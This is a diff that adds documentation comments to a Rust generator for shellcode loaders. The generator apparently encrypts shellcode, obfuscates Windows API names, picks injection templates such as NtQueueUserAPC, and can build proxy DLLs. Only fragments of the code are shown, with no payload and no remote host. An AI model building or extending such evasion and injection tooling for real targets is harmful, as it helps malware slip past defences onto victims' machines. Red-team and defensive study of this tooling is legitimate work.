@@ -16,11 +16,20 @@ use std::path::{Path, PathBuf};
 use std::process::exit;
 use std::time::{SystemTime, UNIX_EPOCH};
 
+/// Obfuscate API function name using XOR with a key
+/// 
+/// # Arguments
+/// * `name` - The API function name to obfuscate
+/// * `key` - The XOR key to use
+/// 
+/// # Returns
+/// Obfuscated string representation of the API name
 fn obfuscate_api_name(name: &str, key: u8) -> String {
     let bytes: Vec<String> = name.bytes().map(|b| format!("0x{:02x}", b ^ key)).collect();
     format!("[{}]", bytes.join(", "))
 }
 
+/// Generate a non-zero random key for API obfuscation
 fn non_zero_random_key() -> u8 {
     loop {
         let k = random_u8();
@@ -34,6 +43,13 @@ const OUTPUT_DIR: &str = "shared";
 const LITCRYPT_DEPENDENCY: &str = r#"litcrypt = "0.4""#;
 const LITCRYPT_SETUP: &str = "#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();";
 
+/// Build the dependencies string for Cargo.toml
+/// 
+/// # Arguments
+/// * `template_dependencies` - Optional additional dependencies from the encryption method
+/// 
+/// # Returns
+/// Complete dependencies string
 fn build_dependencies(template_dependencies: Option<String>) -> String {
     match template_dependencies {
         Some(dependencies) if !dependencies.trim().is_empty() => {
@@ -43,6 +59,15 @@ fn build_dependencies(template_dependencies: Option<String>) -> String {
     }
 }
 
+/// Search and replace text in a file
+/// 
+/// # Arguments
+/// * `path_to_file` - Path to the file to modify
+/// * `search` - Text to search for
+/// * `replace` - Text to replace with
+/// 
+/// # Returns
+/// Result indicating success or failure
 fn search_and_replace(
     path_to_file: &Path,
     search: &str,
@@ -60,6 +85,13 @@ fn search_and_replace(
     Ok(())
 }
 
+/// Create a timestamped output folder
+/// 
+/// # Arguments
+/// * `parent` - Parent directory
+/// 
+/// # Returns
+/// Path to the created output folder
 fn create_root_folder(parent: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
     let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
     let folder_name = format!("output_{}", timestamp);
@@ -71,6 +103,14 @@ fn create_root_folder(parent: &Path) -> Result<PathBuf, Box<dyn std::error::Erro
     Ok(result_path)
 }
 
+/// Copy a template directory to the output location
+/// 
+/// # Arguments
+/// * `source` - Source template directory
+/// * `dest` - Destination directory
+/// 
+/// # Returns
+/// Result indicating success or failure
 fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
     let options = CopyOptions {
         content_only: true,
@@ -81,6 +121,13 @@ fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::E
     Ok(())
 }
 
+/// Get the template path for a given execution method
+/// 
+/// # Arguments
+/// * `execution` - The execution method
+/// 
+/// # Returns
+/// Path to the template directory
 fn template_path_for_execution(execution: &Execution) -> &'static Path {
     match execution {
         Execution::NtQueueUserAPC => Path::new("templates/ntAPC/."),
@@ -94,6 +141,13 @@ fn template_path_for_execution(execution: &Execution) -> &'static Path {
     }
 }
 
+/// Get the encrypted filename based on encryption method
+/// 
+/// # Arguments
+/// * `encryption` - The encryption method
+/// 
+/// # Returns
+/// Filename for the encrypted shellcode
 fn encrypted_filename(encryption: &Encryption) -> &'static str {
     match encryption {
         Encryption::Xor => "input.xor",
@@ -102,6 +156,14 @@ fn encrypted_filename(encryption: &Encryption) -> &'static str {
     }
 }
 
+/// Build the encrypted shellcode output
+/// 
+/// # Arguments
+/// * `order` - The configuration order
+/// * `src_dir` - Source directory for the output
+/// 
+/// # Returns
+/// Tuple of (EncryptionOutput, include_path)
 fn build_encrypted_output(order: &Order, src_dir: &Path) -> (EncryptionOutput, String) {
     let filename = encrypted_filename(&order.encryption);
     let path = src_dir.join(filename);
@@ -121,6 +183,14 @@ fn build_encrypted_output(order: &Order, src_dir: &Path) -> (EncryptionOutput, S
     (output, include_path)
 }
 
+/// Build all replacements for the template
+/// 
+/// # Arguments
+/// * `order` - The configuration order
+/// * `src_dir` - Source directory for the output
+/// 
+/// # Returns
+/// HashMap of replacements to apply to the template
 fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, String> {
     let (enc_output, include_path) = build_encrypted_output(order, src_dir);
     let dependencies = build_dependencies(enc_output.dependencies);
@@ -185,6 +255,15 @@ fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, St
     replacements
 }
 
+/// Apply DLL format to the template
+/// 
+/// # Arguments
+/// * `replacements` - HashMap of replacements to update
+/// * `main_rs_path` - Path to the main.rs file
+/// * `is_proxy` - Whether this is a proxy DLL
+/// 
+/// # Returns
+/// Path to the target file (lib.rs for DLL, main.rs for EXE)
 fn apply_dll_format(
     replacements: &mut HashMap<&'static str, String>,
     main_rs_path: &Path,
@@ -270,6 +349,12 @@ fn apply_dll_format(
     lib_rs_path
 }
 
+/// Apply all replacements to the template files
+/// 
+/// # Arguments
+/// * `replacements` - HashMap of replacements to apply
+/// * `main_path` - Path to the main source file
+/// * `cargo_path` - Path to the Cargo.toml file
 fn apply_replacements(replacements: &HashMap<&str, String>, main_path: &Path, cargo_path: &Path) {
     for (key, value) in replacements {
         search_and_replace(main_path, key, value)
@@ -279,6 +364,13 @@ fn apply_replacements(replacements: &HashMap<&str, String>, main_path: &Path, ca
     }
 }
 
+/// Find the position to insert the proxy module
+/// 
+/// # Arguments
+/// * `existing` - Existing file content
+/// 
+/// # Returns
+/// Byte offset where to insert the proxy module
 fn proxy_module_insert_offset(existing: &str) -> usize {
     if let Some(pos) = existing.find("use_litcrypt!();") {
         let after_marker = pos + "use_litcrypt!();".len();
@@ -301,6 +393,11 @@ fn proxy_module_insert_offset(existing: &str) -> usize {
     inner_attr_end.min(existing.len())
 }
 
+/// Apply proxy DLL configuration
+/// 
+/// # Arguments
+/// * `order` - The configuration order
+/// * `folder` - Output folder path
 fn apply_proxy(order: &Order, folder: &Path) {
     let proxy_path = order.proxy_dll.as_ref().unwrap();
     let exports = pe_parser::parse_exports(proxy_path).unwrap_or_else(|e| {
@@ -336,6 +433,13 @@ fn apply_proxy(order: &Order, folder: &Path) {
     );
 }
 
+/// Main function to assemble the Rust code for the loader
+/// 
+/// # Arguments
+/// * `order` - The configuration order
+/// 
+/// # Returns
+/// Path to the output folder containing the generated Rust code
 pub fn assemble(order: Order) -> PathBuf {
     println!("[+] Assembling Rust code..");
 
